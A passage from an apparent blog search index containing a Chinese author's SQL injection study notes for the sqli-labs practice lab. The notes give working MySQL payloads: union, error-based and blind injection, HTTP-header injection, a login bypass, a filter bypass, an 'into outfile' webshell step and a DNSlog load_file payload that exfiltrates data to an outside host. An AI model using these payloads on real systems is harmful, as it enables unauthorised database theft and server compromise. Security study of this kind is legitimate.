1)：在网格布局中添加两个文本编辑器（QTextEdit和QPlainTextEdit），分别位于第0行第0列和第0行第1列。<br><br>self.mainLayout.addLayout(self.layout_3)：将网格布局添加到主布局中。<br><br>self.slider = QSlider()：创建一个滑块（QSlider）。<br><br>self.slider.setOrientation(Qt.Orientation.Horizontal)：设置滑块的方向为水平方向。<br><br>self.slider.setTickInterval(10)：设置滑块的刻度间隔为10。<br><br>self.slider.setTickPosition(QSlider.TickPosition.TicksBelow)：设置滑块的刻度位置在滑块下方。<br><br>self.slider.valueChanged.connect(lambda: self.label.setText(str(self.slider.value())))：当滑块的值发生更改时，连接一个槽函数，将标签的文本设置为滑块当前的值（需转换为字符串）。<br><br>self.mainLayout.addWidget(self.slider)：将滑块添加到主布局中。<br>self.mainLayout.addLayout(self.layout_1)：将水平布局添加到主布局中。<br></code></pre></td></tr></table></figure>\n","categories":["PySide6"],"tags":["python"]},{"title":"Sql注入学习总结","url":"/2023/06/16/Sql%E6%B3%A8%E5%85%A5%E5%AD%A6%E4%B9%A0%E6%80%BB%E7%BB%93/","content":"<p>今天对前面的sql注入学习做一个总结</p>\n<span id=\"more\"></span>\n\n<p>对应博客笔记:<a href=\"https://www.handsome-vincent.space/categories/SQL-Study/\">https://www.handsome-vincent.space/categories/SQL-Study/</a></p>\n<p><strong>注意这篇文章仅仅只是针对于MySQL数据库的</strong></p>\n<h1 id=\"基本增删改查\"><a href=\"#基本增删改查\" class=\"headerlink\" title=\"基本增删改查\"></a>基本增删改查</h1><p>对应博客笔记的1,2</p>\n<h1 id=\"简单数字型注入字符型注入\"><a href=\"#简单数字型注入字符型注入\" class=\"headerlink\" title=\"简单数字型注入字符型注入\"></a>简单数字型注入字符型注入</h1><p>博客#3,用到的函数和语句:</p>\n<ul>\n<li>order by n 判断字段数(group by 也可以)</li>\n<li>union select 联合查询(联合的是前面待拼接的select语句)</li>\n<li>基本语句见博客分类下的3</li>\n</ul>\n<h2 id=\"字符型注入\"><a href=\"#字符型注入\" class=\"headerlink\" title=\"字符型注入\"></a>字符型注入</h2><p>用到的函数和语句几乎同上,不同:</p>\n<ul>\n<li>闭合方式单引号双引号几个括号</li>\n<li>注释 –,#,&#x2F;* *&#x2F;,&#x2F;*! *&#x2F;(感叹号后面需要版本号一般写90000就够了)</li>\n</ul>\n<h1 id=\"其他注入方式\"><a href=\"#其他注入方式\" class=\"headerlink\" title=\"其他注入方式\"></a>其他注入方式</h1><h2 id=\"extractvalue报错注入-博客-4\"><a href=\"#extractvalue报错注入-博客-4\" class=\"headerlink\" title=\"extractvalue报错注入 博客#4\"></a>extractvalue报错注入 博客#4</h2><p>extractvalue(随便写,concat(不可能被识别的字符,(注入语句)))</p>\n<p>extractvalue介绍见博客分类下#4 主要就是通过xpath语句报错回显<br>concat函数拼接所有参数为一个字符串(博客也有)</p>\n<h2 id=\"updatexml报错注入-博客-5\"><a href=\"#updatexml报错注入-博客-5\" class=\"headerlink\" title=\"updatexml报错注入 博客#5\"></a>updatexml报错注入 博客#5</h2><p>updatexml(随便写,concat(不可能被识别的字符,(注入语句),随便写))</p>\n<p>前两个参数和上面一样,第三个参数就是找到第二个xpath语句找到的参数后要替换的内容,实战中不可能匹配上,因此不会执行<br>报错返回32字符报错(去掉concat第一个参数只有31个)</p>\n<h2 id=\"floor报错注入-博客-6\"><a href=\"#floor报错注入-博客-6\" class=\"headerlink\" title=\"floor报错注入 博客#6\"></a>floor报错注入 博客#6</h2><p>  他的主要函数:</p>\n<ul>\n<li>floor(int)向下去整(我觉得就是去尾)</li>\n<li>rand(n)生成随机数,是种子,填入特定值后不再是随机数</li>\n<li>count(列名)相当于Python的count函数,具体的博客文章介绍很清晰</li>\n<li>concat_ws(1,2,3)第2,3个参数用第一个参数连接</li>\n<li>as x group by x 将结果保存到x然后对x分组<br>主要原理:<br>count函数添加数据时会重新计算数据使floor(rand(0)*2)稳定造成报错利用错误回显<br>返回64字符报错</li>\n</ul>\n<h2 id=\"布尔盲注-博客-7\"><a href=\"#布尔盲注-博客-7\" class=\"headerlink\" title=\"布尔盲注 博客#7\"></a>布尔盲注 博客#7</h2><p>  他的函数很多:</p>\n<ul>\n<li>length(字符)  相当于Python的len()</li>\n<li>ascii(字符)  相当于Python的ord()</li>\n<li>substr&#x2F;substring(字符串,起始,长度)切割作用,相当于Python的string[起始:结束]</li>\n<li>strcmp(string1,string2) (博客#17)字符串ascii比较大小</li>\n<li>ifnull() <a href=\"https://www.handsome-vincent.space/2023/06/15/Sql%E6%B3%A8%E5%85%A5%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0-17/#ifnull%E5%87%BD%E6%95%B0\">#17</a> 原理和if差不多</li>\n</ul>\n<p>  原理就是利用界面样式布尔判断:<br>  如果手动试很麻烦,需要借助Python写一个爆破脚本啥的</p>\n<h2 id=\"时间盲注-博客-8\"><a href=\"#时间盲注-博客-8\" class=\"headerlink\" title=\"时间盲注 博客#8\"></a>时间盲注 博客#8</h2><p>  界面没有改变的时候不可以使用布尔盲注时可以用这个<br>  主要函数:</p>\n<ul>\n<li>if(判断条件,true执行语句,false执行语句)</li>\n<li>sleep(int)<br>主要原理,利用界面响应时间布尔判断</li>\n</ul>\n<h2 id=\"文件上传-博客-8\"><a href=\"#文件上传-博客-8\" class=\"headerlink\" title=\"文件上传 博客#8\"></a>文件上传 博客#8</h2><p>  主要语句:</p>\n<ul>\n<li>“PHP webshell” into outfile “转义路径” 然后用菜刀或蚁剑连</li>\n</ul>\n<h2 id=\"dnslog盲注-博客-9\"><a href=\"#dnslog盲注-博客-9\" class=\"headerlink\" title=\"dnslog盲注 博客#9\"></a>dnslog盲注 博客#9</h2><p>  主要语句函数:</p>\n<ul>\n<li>load_file(路径)</li>\n<li>前面加上’’&#x2F;&#x2F;‘’就是加载网络路径了用 <a href=\"http://www.dnslog.cn/\">www.dnslog.cn</a> 获取回显,更高效率<br>自动化dnslog不得劲不讲了,博客里面也讲了</li>\n</ul>\n<h2 id=\"堆叠注入\"><a href=\"#堆叠注入\" class=\"headerlink\" title=\"堆叠注入\"></a>堆叠注入</h2><p> 通过mysqli_multi_query注入,<br> 在语句后面加上分号,具体见#17</p>\n<h1 id=\"post下的注入-博客-10\"><a href=\"#post下的注入-博客-10\" class=\"headerlink\" title=\"post下的注入 博客#10\"></a>post下的注入 博客#10</h1><p>  函数什么的注入方式什么的同上,只是位置变为了post,需要配合burpsuite抓包获取post格式<br>http头下的注入 博客#11</p>\n<ul>\n<li>ua注入就是在UA里面编辑</li>\n<li>cookie注入就是在cookie里面编辑</li>\n<li>referer注入就是在referer里面编辑</li>\n<li>xff注入就是在X-Forwarded-For里面编辑</li>\n</ul>\n<h1 id=\"绕过过滤\"><a href=\"#绕过过滤\" class=\"headerlink\" title=\"绕过过滤\"></a>绕过过滤</h1><p>绕过过滤姿势,博客12,13,14</p>\n<p>后面也许会研究研究bypass 安全狗</p>\n","categories":["SQL_Study"],"tags":["sql"]},{"title":"Sql注入学习笔记#1","url":"/2023/05/31/Sql%E6%B3%A8%E5%85%A5%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0-1/","content":"<p>今天开始进入一个新的学习——SQL注入</p>\n<p>今天就是简单的增删改</p>\n<span id=\"more\"></span>\n\n<h1 id=\"0-语\"><a href=\"#0-语\" class=\"headerlink\" title=\"0 语\"></a>0 语</h1><p>此笔记来源于：</p>\n<p><a href=\"https://www.bilibili.com/video/BV1c34y1h7So\">https://www.bilibili.com/video/BV1c34y1h7So</a></p>\n<p>基本的环境配置什么的就不说了，</p>\n<p>我之前已经配置好了，</p>\n<p>并且图形化的我直接放弃了</p>\n<p>此笔记中有任何问题请指正我🌹</p>\n<p>废话少说直接开始</p>\n<h1 id=\"1-增\"><a href=\"#1-增\" class=\"headerlink\" title=\"1 增\"></a>1 增</h1><p><code>create database 数据库名字 charset utf8;</code>—-创建一个数据库与并设置他的编码格式为utf8</p>\n<p><code>create table 表名</code>—-在数据库中创建一个表</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><code class=\"hljs plaintext\"><br>create table test<br>(<br><br>\tname varchar(100),    # 名字+空格+数据类型<br>\tage int<br><br>);    # 不要忘记分号<br></code></pre></td></tr></table></figure>\n\n<p><code>insert into 表名 (name,age) values (&#39;这是他的名字&#39;,18);</code>—-添加行</p>\n<p><code>alter table 表名 add 列名 数据类型;</code>—-添加表头（列）</p>\n<p>这个alter有点小难，问了一下chatgpt</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><code class=\"hljs plaintext\">在SQL中，使用ALTER TABLE语句来修改表结构，包括添加、修改或删除列。以下是向表添加列的语法和用法：<br><br>ALTER TABLE table_name ADD column_name data_type;<br>其中，table_name是您要修改的表的名称，column_name是要添加的新列的名称，data_type指定了该列的数据类型。<br><br>例如，将名为&quot;users&quot;的表添加一个新列称为&quot;age&quot;，并指定它为整数类型（INT）：<br><br>ALTER TABLE users ADD age INT;<br>如果需要给新列指定默认值，可以使用DEFAULT关键字。例如，给新列设置一个默认值为0：<br><br>ALTER TABLE users ADD age INT DEFAULT 0;<br>注意：不同的SQL实现可能会有所不同，因此请查看您所使用的数据库的文档以获取更准确的信息。<br></code></pre></td></tr></table></figure>\n\n<p>😘</p>\n<h1 id=\"2-删\"><a href=\"#2-删\" class=\"headerlink\" title=\"2 删\"></a>2 删</h1><p><code>drop database/table 数据库/表名;</code>—-删除一个已经创建过的数据库&#x2F;表</p>\n<p><code>alert table 表名 drop 表头名;</code>—-在表中删除表头(删除列)</p>\n<p><code>delete from 表名 where 表头=值;</code>—-删除行</p>\n<p><code>delete from 表名;</code>—-删除表</p>\n<h1 id=\"3-改\"><a href=\"#3-改\" class=\"headerlink\" title=\"3 改\"></a>3 改</h1><p><code>rename table/database 表/数据库名字 to 改后名字;</code>—-给一个表或者数据库改名</p>\n<p><code>alter table 表名 charset set utf8;</code>—-修改字符级</p>\n<p><code>update 表名 set 表头名=值;</code>—-修改特定表头下的值（类似与excel的格式刷）</p>\n<p>这里注意，“&#x3D;”后面的值的类型，应该与创建时定义的数据类型一致</p>\n<p><code>update 表名 set 表头名=值 where id=1;</code>—-修改id为1的那一行的指定数据</p>\n<p>这里的id我理解为索引，并且是从1开始的索引</p>\n<p><code>update 表名 set 表头名=值,表头名2=值2... where id=1;</code>—-在上一个基础上修改更多</p>\n<h1 id=\"4-查\"><a href=\"#4-查\" class=\"headerlink\" title=\"4 查\"></a>4 查</h1><p><code>show databases;</code> —-查看所有数据库</p>\n<p>（更多查在下一个笔记</p>\n<h1 id=\"5-例\"><a href=\"#5-例\" class=\"headerlink\" title=\"5 例\"></a>5 例</h1><p>基础版</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><code class=\"hljs plaintext\">mysql&gt; create database test_database charset utf8;<br>Query OK, 1 row affected, 1 warning (0.01 sec)<br><br>mysql&gt; use test_database;<br>Database changed<br>mysql&gt; create table test_table(<br>    -&gt; name varchar(100),<br>    -&gt; age int);<br>Query OK, 0 rows affected (0.01 sec)<br><br>mysql&gt; insert into test_table (name, age) values (&#x27;John&#x27;, 25);<br>Query OK, 1 row affected (0.00 sec)<br><br>mysql&gt; select * from test_table;<br>+------+------+<br>| name | age  |<br>+------+------+<br>| John |   25 |<br>+------+------+<br>1 row in set (0.00 sec)<br><br>mysql&gt; drop table test_table;<br>Query OK, 0 rows affected (0.01 sec)<br><br>mysql&gt; drop database test_database;<br>Query OK, 0 rows affected (0.02 sec)<br><br>mysql&gt; create database test_database charset utf8;<br>Query OK, 1 row affected, 1 warning (0.01 sec)<br><br>mysql&gt; use test_database;<br>Database changed<br>mysql&gt; create table test_table(<br>    -&gt; name varchar(100),<br>    -&gt; age int);<br>Query OK, 0 rows affected (0.01 sec)<br><br>mysql&gt; insert into test_table (name,age) values (&#x27;Vincent&#x27;,18);<br>Query OK, 1 row affected (0.00 sec)<br><br>mysql&gt; select * from test_table;<br>+---------+------+<br>| name    | age  |<br>+---------+------+<br>| Vincent |   18 |<br>+---------+------+<br>1 row in set (0.00 sec)<br><br>mysql&gt; alter table test_table add new_column varchar(20);<br>Query OK, 0 rows affected (0.01 sec)<br>Records: 0  Duplicates: 0  Warnings: 0<br><br>mysql&gt; select * from test_table;<br>+---------+------+------------+<br>| name    | age  | new_column |<br>+---------+------+------------+<br>| Vincent |   18 | NULL       |<br>+---------+------+------------+<br>1 row in set (0.00 sec)<br><br>mysql&gt; insert into test_table (name,age) values (&#x27;Tina&#x27;,18);<br>Query OK, 1 row affected (0.00 sec)<br><br>mysql&gt; select * from test_table;<br>+---------+------+------------+<br>| name    | age  | new_column |<br>+---------+------+------------+<br>| Vincent |   18 | NULL       |<br>| Tina    |   18 | NULL       |<br>+---------+------+------------+<br>2 rows in set (0.00 sec)<br><br>mysql&gt; alter table test_table drop new_column;<br>Query OK, 0 rows affected (0.01 sec)<br>Records: 0  Duplicates: 0  Warnings: 0<br><br>mysql&gt; select * from test_table;<br>+---------+------+<br>| name    | age  |<br>+---------+------+<br>| Vincent |   18 |<br>| Tina    |   18 |<br>+---------+------+<br>2 rows in set (0.00 sec)<br><br>mysql&gt; delete from test_table where name=&#x27;Vincent&#x27;;<br>Query OK, 1 row affected (0.00 sec)<br><br>mysql&gt; select * from test_table;<br>+------+------+<br>| name | age  |<br>+------+------+<br>| Tina |   18 |<br>+------+------+<br>1 row in set (0.00 sec)<br></code></pre></td></tr></table></figure>\n\n<p>这里有一个坑请注意：</p>\n<p>当你还没有向这个表中insert 信息的时候，</p>\n<p>你之前设置的表头是不会显示出来的，</p>\n<p>因此要先插入数据！</p>\n<p>剩下update那个偷个懒不做了</p>\n<h1 id=\"6-别\"><a href=\"#6-别\" class=\"headerlink\" title=\"6 别\"></a>6 别</h1><p>今天就这些内容吧！</p>\n","categories":["SQL_Study"],"tags":["sql"]},{"title":"Sql注入学习笔记#10","url":"/2023/06/07/Sql%E6%B3%A8%E5%85%A5%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0-10/","content":"<p>这篇文章学习Post下的union注入，</p>\n<p>Post报错注入，Post布尔盲注、Post-DNSlog注入</p>\n<span id=\"more\"></span>\n\n<p>这一篇文章相当于是学完全部post注入</p>\n<p>首先知道post和get提交的不同点</p>\n\n\n<h1 id=\"1-万能密码\"><a href=\"#1-万能密码\" class=\"headerlink\" title=\"1 万能密码\"></a>1 万能密码</h1><p>其实up讲的很清楚了</p>\n<p>他就是构造一个语句</p>\n<p>select name,pwd from users where $name&#x3D;xxx and $name&#x3D;xxx</p>\n<p>然后只要在name框里面输入admin’ or 1&#x3D;1 #</p>\n<p>密码框随意，</p>\n<p>然后就登陆成功了，</p>\n<p>但是我们如果不只是想要登陆成功，</p>\n<p>而是想要获取数据库中的全部内容呢？</p>\n<h1 id=\"2-实战注入\"><a href=\"#2-实战注入\" class=\"headerlink\" title=\"2 实战注入\"></a>2 实战注入</h1><p>首先先用burpsuite抓一下包，</p>\n<p>获取那个post传送的东西复制一下到hackbar</p>\n<p>（里面的工具不多说了</p>\n<p>注意hackbar要打开postdata，</p>\n<p>复制到下面那个框，然后上面先loadurl一下，</p>\n<p>后面想要修改参数都是在下面修改，</p>\n<p>后面的就和前面的sql注入差不多了</p>\n<h2 id=\"2-1-union注入\"><a href=\"#2-1-union注入\" class=\"headerlink\" title=\"2.1 union注入\"></a>2.1 union注入</h2>\n\n<p>首先orderby一下</p>\n<p>然后获取回显点（见上图）</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><code class=\"hljs plaintext\">获取数据库中有哪些表<br>uname=-admin&#x27; union select 1,group_concat(table_name) from information_schema.tables where table_schema=database() #&amp;passwd=111&amp;submit=Submit<br><br>获取数据库的表中有哪些列<br>uname=-admin&#x27; union select 1,group_concat(column_name) from information_schema.columns where table_schema=database() and table_name=&#x27;users&#x27;#&amp;passwd=111&amp;submit=Submit<br><br>然后就可以直接查询里面的数据了<br>uname=-admin&#x27; union select 1,group_concat(id,username,password) from users #&amp;passwd=111&amp;submit=Submit<br><br>结束，获取到全部内容<br>1DumbDumb,2AngelinaI-kill-you,3Dummyp@ssword,4securecrappy,5stupidstupidity,6supermangenious,7batmanmob!le,8adminadmin,9admin1admin1,10admin2admin2,11admin3admin3,12dhakkandumbo,14admin4admin4<br></code></pre></td></tr></table></figure>\n\n<p>其实这一套就是最普通最简单的注入流程了</p>\n<p>后面的less12，13，14唯一不同的就是闭合方式了</p>\n<h2 id=\"2-2-updatexml报错注入\"><a href=\"#2-2-updatexml报错注入\" class=\"headerlink\" title=\"2.2 updatexml报错注入\"></a>2.2 updatexml报错注入</h2><p>up在课上使用的是floor报错，</p>\n<p>那我这里使用一下updatexml吧</p>\n<p>（和extractvalue几乎一样）</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><code class=\"hljs plaintext\">获取数据库中的的表<br>uname=-admin&quot; union select 1,updatexml(1,concat(0x7e,(select group_concat(table_name) from information_schema.tables where table_schema=database())),1) #&amp;passwd=111&amp;submit=Submit<br><br>获取表中的列<br>uname=-admin&quot; union select 1,updatexml(1,concat(0x7e,(select group_concat(column_name) from information_schema.columns where table_schema=database() and table_name=&#x27;users&#x27;)),1) #&amp;passwd=111&amp;submit=Submit<br><br>最后一步，获取全部数据<br>uname=-admin&quot; union select 1,updatexml(1,concat(0x7e,(select group_concat(id,username,password) from users)),1) #&amp;passwd=111&amp;submit=Submit<br><br>配合substring<br>uname=-admin&quot; union select 1,updatexml(1,concat(0x7e,substring((select group_concat(id,username,password) from users),31,31)),1) #&amp;passwd=111&amp;submit=Submit<br></code></pre></td></tr></table></figure>\n\n<h2 id=\"2-3-floor报错注入\"><a href=\"#2-3-floor报错注入\" class=\"headerlink\" title=\"2.3 floor报错注入\"></a>2.3 floor报错注入</h2><p>当然floor也可以试一试</p>\n<p>这里直接最后一步了吧</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><code class=\"hljs plaintext\">uname=admin&quot; union select count(*),concat_ws(&#x27;-&#x27;,(select concat(id,&#x27;-&#x27;,username,&#x27;:&#x27;,password) from users limit 1,1),floor(rand(0)*2)) as x from information_schema.tables group by x#&amp;passwd=111&amp;submit=Submit<br></code></pre></td></tr></table></figure>\n\n<p><strong>注意千万不要忘记后面的as 、group by！！！</strong></p>\n<h2 id=\"2-4-布尔盲注\"><a href=\"#2-4-布尔盲注\" class=\"headerlink\" title=\"2.4 布尔盲注\"></a>2.4 布尔盲注</h2><p>这里就是less15了</p>\n<p>首先burpsuite抓一下包看一下有没有和前面格式不一样的地方</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><code class=\"hljs plaintext\">uname=admin&amp;passwd=123&amp;submit=Submit<br></code></pre></td></tr></table></figure>\n\n<p>没有变化，好吧</p>\n<p>然后判断闭合</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><code class=\"hljs plaintext\">uname=admin&#x27; or 1=1#&amp;passwd=123&amp;submit=Submit<br></code></pre></td></tr></table></figure>\n\n<p>这里显示successfully login了，说明闭合就是一个单引号，</p>\n<p>接下来开始构建语句，</p>\n<p>注意要把uname改成永久报错的东西</p>\n<p>语句构造在or后面，返回successfully login说明是true，</p>\n<p>failed login代表是false，</p>\n<p>那么接下来就是漫长的爆破了，</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><code class=\"hljs plaintext\">uname=-admin&#x27; or (length(database())=8)#&amp;passwd=123&amp;submit=Submit<br><br>uname=-admin&#x27; or ascii(substr(database(),1,1))=115#&amp;passwd=123&amp;submit=Submit<br>..........<br></code></pre></td></tr></table></figure>\n\n<p>后面的不搞了</p>\n<p>（如果实战这里没有回显可以使用if）</p>\n<h2 id=\"2-5-DNSlog手动注入\"><a href=\"#2-5-DNSlog手动注入\" class=\"headerlink\" title=\"2.5 DNSlog手动注入\"></a>2.5 DNSlog手动注入</h2><p>首先就是那个ceye.io要注册好</p>\n<p>然后就开始吧</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><code class=\"hljs plaintext\">passwd=admin&amp;Submit=Submit&amp;uname=adm&#x27; and (select load_file(concat(&quot;//&quot;,(database()),&quot;.你的域名.ceye.io/abc&quot;)))#<br>..............后面的不搞了<br></code></pre></td></tr></table></figure>\n\n<p><strong>注意concat里面是双引号！！！！！！！！！</strong></p>\n<p>因为这个我又卡了好长时间</p>\n<p><strong>使用单引号闭合可能会和前面的单引号闭合发生冲突！！！</strong></p>\n<h2 id=\"2-6-DNSlog自动注入\"><a href=\"#2-6-DNSlog自动注入\" class=\"headerlink\" title=\"2.6 DNSlog自动注入\"></a>2.6 DNSlog自动注入</h2><p>算了这个不搞了。。。</p>\n<p>kali懒得开机了</p>\n","categories":["SQL_Study"],"tags":["sql"]},{"title":"Sql注入学习笔记#11","url":"/2023/06/08/Sql%E6%B3%A8%E5%85%A5%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0-11/","content":"<p>这篇文章学习http头useragent注入，</p>\n<p>referer注入，cookie注入</p>\n<span id=\"more\"></span>\n\n<h1 id=\"1-uagent-注入\"><a href=\"#1-uagent-注入\" class=\"headerlink\" title=\"1 uagent 注入\"></a>1 uagent 注入</h1><p>首先burp抓到包，</p>\n<p>然后在user agent这里构造语句</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><code class=\"hljs plaintext\">&#x27; or updatexml(1,concat(0x7e,(select group_concat(table_name) from information_schema.tables where table_schema=database())),1),2,3) #  <br></code></pre></td></tr></table></figure>\n\n<p>获取了数据库中的表名，</p>\n<p>然后后面的就是老一套了，</p>\n<p>这里不搞了，</p>\n<p>主要讲一下原理</p>\n<p>原来的语句是</p>\n<figure class=\"highlight php\"><table><tr><td class=\"code\"><pre><code class=\"hljs php\"><span class=\"hljs-variable\">$insert</span>=<span class=\"hljs-string\">&quot;INSERT INTO `security`.`uagents` (`uagent`, `ip_address`, `username`) VALUES (&#x27;<span class=\"hljs-subst\">$uagent</span>&#x27;, &#x27;<span class=\"hljs-subst\">$IP</span>&#x27;, <span class=\"hljs-subst\">$uname</span>)&quot;</span>;<br></code></pre></td></tr></table></figure>\n\n<p>这句话的大致意思就是，</p>\n<p>创建一个insert变量，这个变量做一个字符串拼接，</p>\n<p>将前面获取到的<code>uagent</code> <code>ip_address</code> <code>username</code>插入到uagents这个表中</p>\n<p>但是如果我们的uagent这个变量是</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><code class=\"hljs plaintext\">&#x27; or (你的语句),2,3 #<br></code></pre></td></tr></table></figure>\n\n<p>那么是不是原来的语句就变成了</p>\n<figure class=\"highlight php\"><table><tr><td class=\"code\"><pre><code class=\"hljs php\"><span class=\"hljs-variable\">$insert</span>=<span class=\"hljs-string\">&quot;INSERT INTO `security`.`uagents` (`uagent`, `ip_address`, `username`) VALUES (&#x27;&#123;a&#125;&#x27; or (你的语句),2,3 #&#x27;, &#x27;<span class=\"hljs-subst\">$IP</span>&#x27;, <span class=\"hljs-subst\">$uname</span>)&quot;</span><br></code></pre></td></tr></table></figure>\n\n<p>a部分这里肯定为false，因为他需要3个参数，但是这里只有一个，</p>\n<p>所以会执行or后面的东西，or后面就要为true才会执行，</p>\n<p>因此需要给他三个参数，并使用“#”注释掉后面的内容，</p>\n<p>这里“你的语句”部分可以放在2或者3的部分，例如</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><code class=\"hljs plaintext\">&#x27; or 1,(updatexml(1,concat(0x7e,(select group_concat(table_name) from information_schema.tables where table_schema=database())),1)),3) #  <br></code></pre></td></tr></table></figure>\n\n<p>同样也是可以的</p>\n<h2 id=\"1-1-法2——我的思考\"><a href=\"#1-1-法2——我的思考\" class=\"headerlink\" title=\"1.1 法2——我的思考\"></a>1.1 法2——我的思考</h2><p>举一反三一下，</p>\n<p>如果我的语句是这样构造的</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><code class=\"hljs plaintext\">1&#x27;,updatexml(1,concat(0x7e,(select group_concat(table_name) from information_schema.tables where table_schema=database())),1),2) #  <br></code></pre></td></tr></table></figure>\n\n<p>那么在原来的语句中，就会变成这样</p>\n<figure class=\"highlight php\"><table><tr><td class=\"code\"><pre><code class=\"hljs php\"><span class=\"hljs-variable\">$insert</span>=<span class=\"hljs-string\">&quot;INSERT INTO `security`.`uagents` (`uagent`, `ip_address`, `username`) VALUES (&#x27;1&#x27;,updatexml(1,concat(0x7e,(select group_concat(table_name) from information_schema.tables where table_schema=database())),1),2) #  &#x27;, &#x27;<span class=\"hljs-subst\">$IP</span>&#x27;, <span class=\"hljs-subst\">$uname</span>)&quot;</span>;<br></code></pre></td></tr></table></figure>\n\n<p>这里同样是3个参数，可以被执行！</p>\n<p>有几点注意的：</p>\n<ol>\n<li><p>构造的语句应该注意闭合</p>\n<p>例如他在语句中使用的单引号闭合的变量，</p>\n<p>那么我们也要使用单引号</p>\n</li>\n<li><p>构造的语句最后要有”)”</p>\n<p>就因为这一步疏忽了，我卡了好久，</p>\n<p>这其实就是要注意闭合，</p>\n<p>只不过是闭合的整个语句，而不是变量</p>\n</li>\n</ol>\n<h1 id=\"2-referer-注入\"><a href=\"#2-referer-注入\" class=\"headerlink\" title=\"2 referer 注入\"></a>2 referer 注入</h1><p>这个和上面的几乎没有什么不同的</p>\n<p>首先找到less19的源代码</p>\n<p>可以利用的就是这一句</p>\n<figure class=\"highlight php\"><table><tr><td class=\"code\"><pre><code class=\"hljs php\"><span class=\"hljs-variable\">$insert</span>=<span class=\"hljs-string\">&quot;INSERT INTO `security`.`referers` (`referer`, `ip_address`) VALUES (&#x27;<span class=\"hljs-subst\">$uagent</span>&#x27;, &#x27;<span class=\"hljs-subst\">$IP</span>&#x27;)&quot;</span>;<br></code></pre></td></tr></table></figure>\n\n<p>这里面的变量$uagent其实就是referer，</p>\n<p>作者在前面偷了个小懒</p>\n<figure class=\"highlight php\"><table><tr><td class=\"code\"><pre><code class=\"hljs php\"><span class=\"hljs-variable\">$uagent</span> = <span class=\"hljs-variable\">$_SERVER</span>[<span class=\"hljs-string\">&#x27;HTTP_REFERER&#x27;</span>];<br></code></pre></td></tr></table></figure>\n\n<p>变量名值uagent但是获取的是referer</p>\n<p>现在构造一下注入语句</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><code class=\"hljs plaintext\">1&#x27; or 1,extractvalue(doc,concat(0x7e,(select group_concat(table_name) from information_schema.tables where table_schema=database())))) #<br></code></pre></td></tr></table></figure>\n\n<p>或者</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><code class=\"hljs plaintext\">&#x27;,extractvalue(1,concat(0x7e,(select group_concat(table_name) from information_schema.tables where table_schema=database()))))#<br></code></pre></td></tr></table></figure>\n\n<p>这里出现了点小问题。。。。错误似乎回显不出来。。。</p>\n<p>改成mysqli也不行。。。找个在线靶场看看吧</p>\n<p>算了还是不行，跳过这一关吧。。反正我的语句应该没有错</p>\n<h1 id=\"3-cookie-注入\"><a href=\"#3-cookie-注入\" class=\"headerlink\" title=\"3 cookie 注入\"></a>3 cookie 注入</h1><p>首先cookie的基本概念</p>\n\n\n<p>然后开始注入，</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><code class=\"hljs plaintext\">uname=admin&#x27; order by 3#<br><br>uname=abc&#x27; union select 1,2,group_concat(table_name) from information_schema.tables where table_schema=database() #<br><br>uname=abc&#x27; union select 1,2,group_concat(column_name) from information_schema.columns where table_schema=database() and table_name=&#x27;users&#x27;#<br><br>uname=abc&#x27; union select 1,2,group_concat(id,username,password) from users#<br></code></pre></td></tr></table></figure>\n\n<p>注意不要犯低级错误！！！</p>\n<p>order by的时候不能让前面的东西报错，</p>\n<p>但是在后面union select的时候，</p>\n<p>就不能让前面的东西有回显，</p>\n<p>这个容易忘记。。。</p>\n<h1 id=\"4-最后\"><a href=\"#4-最后\" class=\"headerlink\" title=\"4 最后\"></a>4 最后</h1><p>这篇笔记学的是所有http下的注入，</p>\n<p>cookie referer user-agent注入，</p>\n<p>这个我一直有个问题，</p>\n<p>在实战中，真的有人会保存用户的referer user-agent吗？</p>\n","categories":["SQL_Study"],"tags":["sql"]},{"title":"Sql注入学习笔记#12","url":"/2023/06/08/Sql%E6%B3%A8%E5%85%A5%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0-12/","content":"<p>这篇文章讲解各种过滤的绕过方式，</p>\n<p>例如 注释符 and or 逗号等过滤</p>\n<span id=\"more\"></span>\n\n<h1 id=\"1-注释符过滤绕过\"><a href=\"#1-注释符过滤绕过\" class=\"headerlink\" title=\"1 注释符过滤绕过\"></a>1 注释符过滤绕过</h1><p>打开sql-labs的23课，</p>\n<p>发现这是一个非常简单的字符型注入，</p>\n<p>但是你会发现这里注释符被过滤了，</p>\n<p>我首先尝试使用编码漏洞，将#编码成%23，</p>\n<p>但是依旧被过滤了</p>\n<p>既然不能注释后面的内容，那就让后面的内容失效！</p>\n<p>构造如下语句</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><code class=\"hljs plaintext\">?id=-1&#x27; union select 1,2,group_concat(table_name) from information_schema.tables where table_schema=database() and &#x27;1&#x27;=&#x27;1<br></code></pre></td></tr></table></figure>\n\n<p>加上前面后面的语句，就变成了</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><code class=\"hljs plaintext\">&#x27;select * from users where id=-1&#x27; union select 1,2,group_concat(table_name) from information_schema.tables where table_schema=database() and &#x27;1&#x27;=&#x27;1&#x27; limit 0,1<br></code></pre></td></tr></table></figure>\n\n<h1 